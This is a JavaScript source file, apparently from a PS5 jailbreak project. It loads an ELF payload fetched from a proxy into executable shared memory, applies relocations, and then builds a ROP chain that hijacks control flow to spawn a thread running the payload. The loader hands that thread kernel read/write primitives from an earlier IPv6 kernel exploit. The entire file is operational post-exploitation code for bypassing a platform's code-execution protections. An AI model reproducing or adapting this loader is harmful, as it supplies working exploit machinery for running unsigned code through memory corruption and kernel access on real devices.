// https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/elf_loader.lua
// Only expected to load john tornblom's elfldr.elf
// credit to nullptr for porting to lua and specter for the original code
// credit to c0w-ar for isolating rop chain to improve stability

const ELF_SHADOW_MAPPING_ADDR = 0x920100000n;
const ELF_MAPPING_ADDR = 0x926100000n;

function elf_parse(elf_store) {

    // ELF sizes and offsets
    const SIZE_ELF_HEADER = 0x40n;
    const SIZE_ELF_PROGRAM_HEADER = 0x38n;
    const SIZE_ELF_SECTION_HEADER = 0x40n;

    const OFFSET_ELF_HEADER_ENTRY = 0x18n;
    const OFFSET_ELF_HEADER_PHOFF = 0x20n;
    const OFFSET_ELF_HEADER_SHOFF = 0x28n;
    const OFFSET_ELF_HEADER_PHNUM = 0x38n;
    const OFFSET_ELF_HEADER_SHNUM = 0x3cn;

    const OFFSET_PROGRAM_HEADER_TYPE = 0x00n;
    const OFFSET_PROGRAM_HEADER_FLAGS = 0x04n;
    const OFFSET_PROGRAM_HEADER_OFFSET = 0x08n;
    const OFFSET_PROGRAM_HEADER_VADDR = 0x10n;
    const OFFSET_PROGRAM_HEADER_FILESZ = 0x20n;
    const OFFSET_PROGRAM_HEADER_MEMSZ = 0x28n;

    const OFFSET_SECTION_HEADER_TYPE = 0x4n;
    const OFFSET_SECTION_HEADER_OFFSET = 0x18n;
    const OFFSET_SECTION_HEADER_SIZE = 0x20n;

    const OFFSET_RELA_OFFSET = 0x00n;
    const OFFSET_RELA_INFO = 0x08n;
    const OFFSET_RELA_ADDEND = 0x10n;

    const RELA_ENTSIZE = 0x18n;

    // Allocate memory for ELF data and copy it
    const elf_entry = read64_uncompressed(elf_store + OFFSET_ELF_HEADER_ENTRY);
    const elf_entry_point = ELF_MAPPING_ADDR + elf_entry;

    const elf_program_headers_offset = read64_uncompressed(elf_store + OFFSET_ELF_HEADER_PHOFF);
    const elf_program_headers_num = read16_uncompressed(elf_store + OFFSET_ELF_HEADER_PHNUM);

    const elf_section_headers_offset = read64_uncompressed(elf_store + OFFSET_ELF_HEADER_SHOFF);
    const elf_section_headers_num = read16_uncompressed(elf_store + OFFSET_ELF_HEADER_SHNUM);

    let executable_start = 0n;
    let executable_end = 0n;
    let shadow_size = 0n;

    logger.log("elf_parse: parsing " + elf_program_headers_num + " program headers");

    // Parse program headers
    for (let i = 0n; i < elf_program_headers_num; i++) {
        const phdr_offset = elf_program_headers_offset + (i * SIZE_ELF_PROGRAM_HEADER);
        const p_type = read32_uncompressed(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_TYPE);
        const p_flags = read32_uncompressed(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_FLAGS);
        const p_offset = read64_uncompressed(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_OFFSET);
        const p_vaddr = read64_uncompressed(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_VADDR);
        const p_filesz = read64_uncompressed(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_FILESZ);
        const p_memsz = read64_uncompressed(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_MEMSZ);
        const aligned_memsz = (p_memsz + 0x3FFFn) & 0xFFFFC000n;

        if (p_type === 0x01n) {
            const PROT_RW = PROT_READ | PROT_WRITE;
            const PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;

            if ((p_flags & 0x1n) === 0x1n) {
                executable_start = p_vaddr;
                executable_end = p_vaddr + p_memsz;
                shadow_size = aligned_memsz;

                // Create shm with exec permission
                const exec_handle = syscall(SYSCALL.jitshm_create, 0n, aligned_memsz, 0x7n);
                if (exec_handle > 0xFFFFFFFFn) {
                    throw new Error("jitshm_create failed: " + toHex(exec_handle));
                }

                // Create shm alias with write permission
                const write_handle = syscall(SYSCALL.jitshm_alias, exec_handle, 0x3n);
                if (write_handle > 0xFFFFFFFFn) {
                    throw new Error("jitshm_alias failed: " + toHex(write_handle));
                }

                // Map shadow mapping and write into it
                let rc = syscall(SYSCALL.mmap, ELF_SHADOW_MAPPING_ADDR, aligned_memsz, PROT_RW, 0x11n, write_handle, 0n);
                if (rc === 0xffffffffffffffffn) {
                    throw new Error("failed to mmap write_handle as RW");
                }

                // Copy file data to shadow mapping (BSS zeroed by mmap)
                xcopy_uncompressed(elf_store + p_offset, ELF_SHADOW_MAPPING_ADDR, p_filesz);

                // Map executable segment
                if (syscall(SYSCALL.mmap, ELF_MAPPING_ADDR + p_vaddr, aligned_memsz,
                        PROT_RWX, 0x11n, exec_handle, 0n) === 0xffffffffffffffffn) {
                    throw new Error("failed to mmap exec_handle as RWX");
                }
            } else {

                // Copy regular data segment
                if (syscall(SYSCALL.mmap, ELF_MAPPING_ADDR + p_vaddr, aligned_memsz,
                        PROT_RW, 0x1012n, 0xFFFFFFFFn, 0n)  === 0xffffffffffffffffn) {
                    throw new Error("failed to mmap regular data as RW");
                }
                // Copy file data (BSS zeroed by mmap)
                xcopy_uncompressed(elf_store + p_offset, ELF_MAPPING_ADDR + p_vaddr, p_filesz);
            }
        }
    }

    // Apply relocations
    logger.log("elf_parse: applying " + elf_section_headers_num + " relocations");

    for (let i = 0n; i < elf_section_headers_num; i++) {
        const shdr_offset = elf_section_headers_offset + (i * SIZE_ELF_SECTION_HEADER);

        const sh_type = read32_uncompressed(elf_store + shdr_offset + OFFSET_SECTION_HEADER_TYPE);
        const sh_offset = read64_uncompressed(elf_store + shdr_offset + OFFSET_SECTION_HEADER_OFFSET);
        const sh_size = read64_uncompressed(elf_store + shdr_offset + OFFSET_SECTION_HEADER_SIZE);

        if (sh_type === 0x4n) {
            const rela_table_count = sh_size / RELA_ENTSIZE;

            // Parse relocs and apply them
            for (let j = 0n; j < rela_table_count; j++) {
                const rela_entry_offset = sh_offset + j * RELA_ENTSIZE;
                const r_offset = read64_uncompressed(elf_store + rela_entry_offset + OFFSET_RELA_OFFSET);
                const r_info = read64_uncompressed(elf_store + rela_entry_offset + OFFSET_RELA_INFO);
                const r_addend = read64_uncompressed(elf_store + rela_entry_offset + OFFSET_RELA_ADDEND);

                if ((r_info & 0xFFn) === 0x08n) {
                    let reloc_addr = ELF_MAPPING_ADDR + r_offset;
                    const reloc_value = ELF_MAPPING_ADDR + r_addend;

                    // If the relocation falls in the executable section, we need to redirect the write to the
                    // writable shadow mapping or we'll crash
                    if (r_offset >= executable_start && r_offset < executable_end) {
                        reloc_addr = ELF_SHADOW_MAPPING_ADDR + (r_offset - executable_start);
                    }

                    write64_uncompressed(reloc_addr, reloc_value);
                }
            }
        }
    }
    if (shadow_size > 0n) {
        syscall(SYSCALL.munmap, ELF_SHADOW_MAPPING_ADDR, shadow_size);
    }

    logger.log("elf_parse complete");
    return elf_entry_point;
}

function spawn_thread_and_wait(thrd_create_addr, thr_handle_addr, elf_entry_point, args, timespec_addr, name_addr, attr_addr) {
    logger.log("spawn_thread_and_wait entered");

    const pid = syscall(SYSCALL.getpid);

    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n + 1n;

    let i = 0;


    if (attr_addr === null && name_addr == null) {
        logger.log("spawn_thread_and_wait: using libc pthread_create");
        // Arguments for thrd_create
        fake_rop[i++] = g.get('pop_rdi');
        fake_rop[i++] = thr_handle_addr;
        fake_rop[i++] = g.get('pop_rsi');
        fake_rop[i++] = elf_entry_point;
        fake_rop[i++] = g.get('pop_rdx');
        fake_rop[i++] = args;
        fake_rop[i++] = g.get('pop_rcx');
        fake_rop[i++] = 0n;
        fake_rop[i++] = g.get('pop_r8');
        fake_rop[i++] = 0n;
        fake_rop[i++] = g.get('pop_r9');
        fake_rop[i++] = 0n;
        fake_rop[i++] = thrd_create_addr;
    } else {
        logger.log("spawn_thread_and_wait: using scePthreadCreate");
        // scePthreadCreate(handle, attr, entry, arg, name)
        fake_rop[i++] = g.get('pop_rdi');
        fake_rop[i++] = thr_handle_addr;
        fake_rop[i++] = g.get('pop_rsi');
        fake_rop[i++] = attr_addr;
        fake_rop[i++] = g.get('pop_rdx');
        fake_rop[i++] = elf_entry_point;
        fake_rop[i++] = g.get('pop_rcx');
        fake_rop[i++] = args;
        fake_rop[i++] = g.get('pop_r8');
        fake_rop[i++] = name_addr;
        fake_rop[i++] = g.get('pop_r9');
        fake_rop[i++] = 0n;

        // call scePthreadCreate
        fake_rop[i++] = thrd_create_addr;
    }

    // Create Thread
    fake_rop[i++] = thrd_create_addr;

    // Nanosleep syscall
    fake_rop[i++] = g.get('pop_rdi');
    fake_rop[i++] = timespec_addr;
    fake_rop[i++] = g.get('pop_rsi');
    fake_rop[i++] = 0n;
    fake_rop[i++] = g.get('pop_rax');
    fake_rop[i++] = 0xf0n;
    fake_rop[i++] = syscall_wrapper;

    // Kill process
    fake_rop[i++] = g.get('pop_rdi');
    fake_rop[i++] = pid;
    fake_rop[i++] = g.get('pop_rsi');
    fake_rop[i++] = 9n;                        // SIGKILL
    fake_rop[i++] = g.get('pop_rax');
    fake_rop[i++] = 0x25n;
    fake_rop[i++] = syscall_wrapper;

    write64(add_rop_smash_code_store, 0xab00260325n);
    fake_rw[59] = (fake_frame & 0xffffffffn);
    rop_smash(fake_obj_arr[0]);
}


function elf_run(elf_entry_point, payloadout) {
    logger.flush();

    let use_scePthreadCreate = false;

    logger.log("elf_run: elf_entry_point " + toHex(elf_entry_point) + " use_scePthreadCreate=" + use_scePthreadCreate);

    const rwpipe = malloc(8);
    const rwpair = malloc(8);
    const args = malloc(0x30);
    const thr_handle_addr = malloc(8);
    const timespec_addr = malloc(16);

    write32_uncompressed(rwpipe, BigInt(ipv6_kernel_rw.data.pipe_read_fd));
    write32_uncompressed(rwpipe + 0x4n, BigInt(ipv6_kernel_rw.data.pipe_write_fd));

    write32_uncompressed(rwpair, BigInt(ipv6_kernel_rw.data.master_sock));
    write32_uncompressed(rwpair + 0x4n, BigInt(ipv6_kernel_rw.data.victim_sock));

    // Setup timespec for nanosleep: 0.02 second delay
    write64_uncompressed(timespec_addr, 0n);
    write64_uncompressed(timespec_addr + 8n, 250000000n);

    // We are reusing syscall_wrapper from gettimeofdayAddr
    write64_uncompressed(args + 0x00n, syscall_wrapper - 0x7n);        // arg1 = syscall wrapper
    write64_uncompressed(args + 0x08n, rwpipe);                        // arg2 = int *rwpipe[2]
    write64_uncompressed(args + 0x10n, rwpair);                        // arg3 = int *rwpair[2]
    write64_uncompressed(args + 0x18n, ipv6_kernel_rw.data.pipe_addr); // arg4 = uint64_t kpipe_addr
    write64_uncompressed(args + 0x20n, kernel.addr.data_base);         // arg5 = uint64_t kdata_base_addr
    write64_uncompressed(args + 0x28n, payloadout);                    // arg6 = int *payloadout

    let attr_addr = null;
    let name_addr = null;
    let thrd_create_addr = Thrd_create;

    if (use_scePthreadCreate) {
        // scePthreadCreate = libkernel_base + 0x73d0
        thrd_create_addr = libkernel_base + 0x73d0n;
        attr_addr = malloc(0x100);
        name_addr = alloc_string("elfldr");

        // Init pthread attributes
        call(PthreadAttrInit, attr_addr);
        call(PthreadAttrSetstacksize, attr_addr, 0x80000n);
        call(PthreadAttrSetdetachstate, attr_addr, 0n);
    }


    logger.log("elf_run: spawning elfldr thread using thrd_create=" + toHex(thrd_create_addr));
    spawn_thread_and_wait(thrd_create_addr, thr_handle_addr, elf_entry_point, args, timespec_addr, attr_addr, name_addr);
    logger.log("elf_run: elfldr spawned");
    // After this point we cannot use the ROP (process will exit)
}

async function elf_loader() {
    try {
        check_jailbroken();

        logger.log("Loading elfldr.elf from proxy");
        logger.flush();

        const elf_data = malloc(400*1024);
        let elf_size = fetch_file("elfldr-ps5.elf", elf_data, 400*1024);

        logger.log("elfldr fetched, elf_size=" + elf_size);
        if(elf_size < 1000) {
            throw new Error("Something went wrong while reading elfldr.elf");
        }
        const elf_entry_point = elf_parse(elf_data); // We pass the buffer pointer directly

        const payloadout = malloc(4);

        elf_run(elf_entry_point, payloadout);

        logger.log("elfldr complete");
        logger.flush();

    } catch (e) {
        logger.log("elfloader js Error: " + e.message);
        logger.log(e.stack);
        throw e;
    }
}

elf_loader();
